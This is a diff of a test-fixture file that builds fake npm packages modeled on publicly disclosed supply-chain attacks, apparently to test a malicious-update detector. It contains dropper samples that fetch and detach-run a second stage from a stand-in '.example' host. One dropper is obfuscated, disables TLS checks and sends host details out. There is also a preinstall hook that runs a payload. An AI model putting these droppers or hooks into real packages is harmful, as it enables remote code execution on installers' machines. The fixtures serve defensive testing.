@@ -10,6 +10,10 @@ const pkg = (o: Record<string, unknown>) => JSON.stringify(o, null, 2) + "\n";
 const lib = (name: string, version: string, manifest: Record<string, unknown>, rest: Record<string, string>): Pkg =>
   ({ name, version, files: files({ "package.json": pkg({ name, version, main: "index.js", ...manifest }), ...rest }) });
 
+// Naming rule: a fixture package name must not exist on the npm registry, or the fixture would show a real package as compromised.
+// Check each name with: curl -s -o /dev/null -w '%{http_code}' https://registry.npmjs.org/<name>  (it must print 404; a scoped name
+// is written @scope%2fname). The -x suffix marks the names that replaced real packages (kv-store, code-guard, ipc-bus and flow-agent
+// are on npm), so a name that already returns 404 keeps its plain form; any new name only has to return 404.
 export interface HeldOutCase extends Case { disclosed: string; source: string }
 
 const STAGE = `const https = require("https");\nconst { spawn } = require("child_process");\nconst fs = require("fs");\nconst os = require("os");\nconst dest = os.tmpdir() + "/.cache-helper.js";\nhttps.get("https://stage.example/s.js", (r) => { r.pipe(fs.createWriteStream(dest)).on("close", () => spawn(process.execPath, [dest], { detached: true, stdio: "ignore" }).unref()); });\n`;
@@ -70,7 +74,8 @@ const tsHistory = (version: string, extra: Record<string, unknown>, rest: Record
   ({ name: "route-history", version, files: files({ "package.json": pkg({ name: "route-history", version, type: "module", main: "dist/index.js", files: ["dist"], ...extra }), "dist/index.js": TANSTACK_INDEX, ...rest }) });
 
 // Mastra style: the dropper a typosquat's postinstall runs. TLS verification is turned off, marker files are written to
-// the temp directory, a second stage is fetched from a .example host, saved under a random name and started detached.
+// the temp directory, a second stage is fetched from a .example host, saved under a random name and started detached. The decoy
+// count is set so the file is about the 4572 bytes the write-up gives for the dropper.
 const MASTRA_SETUP = obfuscate(`  process.env[@@NODE_TLS_REJECT_UNAUTHORIZED@@] = @@0@@;
   const _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@), _0xc = require(@@child_process@@), _0xh = require(@@https@@);
   const _0xtmp = _0xo[@@tmpdir@@]();
@@ -86,7 +91,7 @@ const MASTRA_SETUP = obfuscate(`  process.env[@@NODE_TLS_REJECT_UNAUTHORIZED@@] 
   });
   _0xreq.on(@@error@@, () => {});
   _0xreq.end(JSON.stringify({ h: _0xo[@@hostname@@](), p: _0xo[@@platform@@]() }));
-`, 17, 60);
+`, 17, 123);
 const DAYJS_LIKE = `module.exports = function dayjs(d) { const t = d === undefined ? new Date() : new Date(d); return { format: () => t.toISOString(), valueOf: () => t.getTime() }; };\n`;
 const mastraHost = (version: string, deps: Record<string, string> | undefined): Pkg =>
   lib("flow-agent-kit-x", version, deps ? { dependencies: deps } : {}, { "index.js": `module.exports = { run: (task) => task() };\n` });
@@ -167,7 +172,7 @@ export const HELDOUT: HeldOutCase[] = [
   {
     id: "antv-wave-style-preinstall-bun", kind: "attack", expect: "hold", disclosed: "2026-05-19",
     source: "https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/",
-    note: "2.2.0 to 2.4.0: the write-up gives the version jump past the latest release, a preinstall hook \"bun run index.js\", the bun runtime added as a dependency and a git optionalDependency on an orphaned commit; the payload posts to a host that mimics trace ingestion. The runtime dependency and the git dependency are listed in the manifest but not modeled as packages, and the write-up gives no commit id, so the hash here is invented",
+    note: "2.2.0 to 2.4.0: the write-up gives the version jump past the latest release, a preinstall hook \"bun run index.js\", the bun runtime added as a dependency and a git optionalDependency on an orphaned commit; the payload posts to a host that mimics trace ingestion (the write-up says the data is encrypted first; the fixture posts plain JSON, so encryption is not modeled). The runtime dependency and the git dependency are listed in the manifest but not modeled as packages, and the write-up gives no commit id, so the hash here is invented",
     base: [lib("chart-vue", "2.2.0", { main: "lib.js" }, { "lib.js": `module.exports = { draw: (el) => el };\n` })],
     head: [lib("chart-vue", "2.4.0", { main: "lib.js", scripts: { preinstall: "bun run index.js" }, dependencies: { bun: "1.2.0" }, optionalDependencies: { "chart-core": "github:example-org/example-chart#4f2a9c1d7e8b3a5069d1c2e4f6a8b0c3d5e7f901" } }, { "lib.js": `module.exports = { draw: (el) => el };\n`, "index.js": ANTV_PAYLOAD })],
   },
